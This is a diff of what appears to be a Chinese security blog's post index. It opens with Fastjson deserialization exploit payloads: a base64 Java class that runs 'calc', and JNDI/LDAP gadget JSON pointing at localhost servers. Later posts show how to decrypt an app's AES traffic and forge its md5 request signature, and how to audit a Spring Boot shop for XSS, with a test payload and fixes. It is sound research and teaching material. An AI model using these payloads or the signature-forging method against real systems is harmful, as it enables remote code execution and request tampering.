&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;_name&quot;: &quot;aaa&quot;,</span><br><span class="line">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class="line">    &quot;_outputProperties&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;data_source&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload4:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">    &quot;targetBeanName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">    &quot;propertyPath&quot;: &quot;foo&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload5:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: Set[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;obj&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;adviceBeanName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;obj&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]&#125;</span><br><span class="line"></span><br><span class="line">payload6:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload7:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class="line">    &quot;jndiName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">    &quot;loginTimeout&quot;: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/</a></p>
+<p><a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a></p>
+<p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
+<p><a href="http://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>通过JS解开加密传输</title>
+    <url>/2020/04/03/JS-Decrypt/</url>
+    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
+<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
+</blockquote>
+<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
+<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
+<a id="more"></a>
+
+<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
+<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
+<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
+<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
+<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
+<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
+<p>偏移量iv：<code>0108489312380708</code></p>
+<p>AES加解密的过程如下图，还是比较清晰的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
+<p>下图是调试过程，密钥就直接拿到了：</p>
+<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
+<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
+<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
+<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
+<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
+<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
+<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
+<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
+<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
+<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
+<p>通过调试可以知道，D是：（去除了\）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
+<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
+<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
+<p>然后复制n和iv的值</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
+<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
+<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
+<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
+<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
 ]]></content>
   </entry>
   <entry>
@@ -316,56 +495,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>通过JS解开加密传输</title>
-    <url>/2020/04/03/JS-Decrypt/</url>
-    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
-<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
-</blockquote>
-<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
-<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
-<a id="more"></a>
-
-<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
-<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
-<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
-<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
-<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
-<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
-<p>偏移量iv：<code>0108489312380708</code></p>
-<p>AES加解密的过程如下图，还是比较清晰的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
-<p>下图是调试过程，密钥就直接拿到了：</p>
-<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
-<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
-<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
-<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
-<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
-<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
-<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
-<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
-<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
-<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
-<p>通过调试可以知道，D是：（去除了\）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
-<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
-<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
-<p>然后复制n和iv的值</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
-<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
-<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
-<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
-<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
     <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
     <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
@@ -413,6 +542,81 @@
 
 <p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
 <img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计四 - XSS</title>
+    <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
+    <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
+<a id="more"></a>
+
+<h1 id="XSS代码审计过程"><a href="#XSS代码审计过程" class="headerlink" title="XSS代码审计过程"></a>XSS代码审计过程</h1><p>我们先从开发者的视角来看，假设一个系统有100个可输入字符的功能点，现在我需要做XSS防护，那么我是不是要在这100个功能点前都做一遍XSS字符过滤呢？都做一遍的话开发可能得累死，而且每个功能点还需要重新进行测试，整个过程下来消耗大量的人力。</p>
+<p>就算一个一个功能点加完字符过滤，那以后项目有新需求，重新添加功能怎么办呢？又给每个功能添加XSS字符过滤？那别的工作还要不要做了。</p>
+<p>所以XSS修复并不是单独进行的，往往是通过Filter或者Interceptor来全局处理。Filter或Interceptor在请求进入Controller前，对请求内容进行处理。这样可以做到统一的字符处理，不用在每个功能点前单独对用户传入的字符进行XSS过滤。</p>
+<p>在代码审计中，找XSS漏洞第一件事是先判断程序中是否存在Filter或者Interceptor。</p>
+<p>一个理想的XSS流程处理的简略图如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/payload-request-path.png" alt="payload-request-path" style="zoom:50%;">
+
+
+
+<p>回到项目结构中来，我们发现其中没有配置任何filter，只有interceptor（拦截器）。Filter和interceptor做的事很相似，但他们的触发时机不同，且interceptor只在Spring中生效，具体差别可以搜索引擎中搜索查看。</p>
+<p>在项目代码中查找发现不存在filter，只有三个interceptor，分别是：<code>AdminLoginInterceptor</code>、<code>NewBeeMallCartNumberInterceptor</code>、<code>NewBeeMallLoginInterceptor</code>。从文件名来判断就知道不存在XSS相关的拦截器。</p>
+<p>可以判断该应用程序中很可能存在XSS。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/do-not-exist-filter.png" alt="do-not-exist-filter" style="zoom:33%;">
+
+
+
+<p>我们先来实际测试一下XSS，在首页搜索框中输入XSS payload <code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try.png" alt="xss-first-try"></p>
+<p>查看返回结果，咦奇怪，怎么XSS payload没有触发呢？</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try-response.png" alt="xss-first-try-response"></p>
+<p>抓包看一下，确定是XSS payload中的<code>&quot;&lt;&gt;</code>被转义了</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-first-try.png" alt="burp-xss-first-try"></p>
+<p>我们下断点调试看一下，传进来的keyword确实是<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，传入Web系统的过程中没有转义处理，那问题出在哪里呢？</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/debug-xss-first-try.png" alt="debug-xss-first-try"></p>
+<p>其实转义出现在输出到模版的过程中，系统使用了thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
+<p><code>/src/main/resources/templates/mall/search.html:33</code></p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/thymeleaf-transfer.png" alt="thymeleaf-transfer"></p>
+<p>此时XSS payload传递路径如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-request-path.png" alt="xss-request-path" style="zoom:50%;">
+
+<p>弄明白XSS payload被转义的原理之后，我们可以转换思路：</p>
+<ol>
+<li>找thymeleaf未作转义的输出，<code>th:utext</code>不会将字符转义</li>
+</ol>
+<p>发现以下模版中存在<code>th:utext</code>，所以这两个功能点存在XSS。其中第二个，<code>detail.html</code>因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用<code>th:utext</code>来显示商品详细。</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/search-not-transferred.png" alt="search-not-transferred"></p>
+<ol start="2">
+<li>找不经过thymeleaf的输出</li>
+</ol>
+<p>在后台，商品信息编辑中输入XSS payload，点击保存</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/not-through-thymeleaf.png" alt="not-through-thymeleaf"></p>
+<p>发现触发我们输入的XSS payload</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-exploit.png" alt="xss-exploit"></p>
+<p>我们可以抓包看一下，商品信息使用jqGrid传输，将返回的json显示到网页中，该过程没有对字符串进行转义，导致XSS漏洞产生。</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-second-try.png" alt="burp-xss-second-try"></p>
+<p>除以上举例之外，系统还存在多处XSS，在此就不一一列举，大家有兴趣的话可以自己试着找找。 </p>
+<h1 id="XSS-修复"><a href="#XSS-修复" class="headerlink" title="XSS 修复"></a>XSS 修复</h1><p>预防存储型和反射型XSS的代码有两种常见方法：</p>
+<ol>
+<li>对HTML做充分转义</li>
+</ol>
+<p>转义一般在filter或interceptor中做，如何添加xss filter网上有很多资料可以参考，比如 <a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a> ，就不在此赘述。</p>
+<p>XSS难以消灭其中一个因素是功能需求与转义相背，比如filter转义把json中的双引号转义导致json无法解析；富文本编辑器就不能转义正常用户所需的html标签，需要额外对允许输入的标签做一个白名单过滤；大于小于号的比较，输入<code>1&lt;2</code>，转义就变成了<code>1 &amp;lt; 2</code>导致功能失效等。</p>
+<p>修复过程中得结合考虑实际的业务场景。</p>
+<ol start="2">
+<li>改成纯前端渲染，避免直接输出html字符，把代码和数据完全分隔开，但是又需要注意DOM XSS的问题。</li>
+</ol>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>除了存储型和反射型XSS，还有DOM型XSS，因为它属于前端JavaScript的范畴，和后端Java代码没有关系，所以我没在本文中提及。</p>
+<p>HttpOnly属性：SpringBoot默认为会话cookie开启httponly，审计时检查是否存在<code>server.servlet.session.cookie.http-only</code>属性，如果存在的话检查其是否被改为false</p>
+<p>CSP：在响应头中添加<code>X-Content-Security-Policy</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSecurityConfig</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">   <span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    http</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      .headers()</span><br><span class="line">        .addHeaderWriter(<span class="keyword">new</span> StaticHeadersWriter(<span class="string">"X-Content-Security-Policy"</span>,<span class="string">"script-src 'self'"</span>))</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
+<p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
+<p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
+<p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
+]]></content>
   </entry>
   <entry>
     <title>Java SpringBoot框架代码审计三 - SQL注入</title>
@@ -542,81 +746,6 @@
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select" target="_blank" rel="noopener">https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select</a></p>
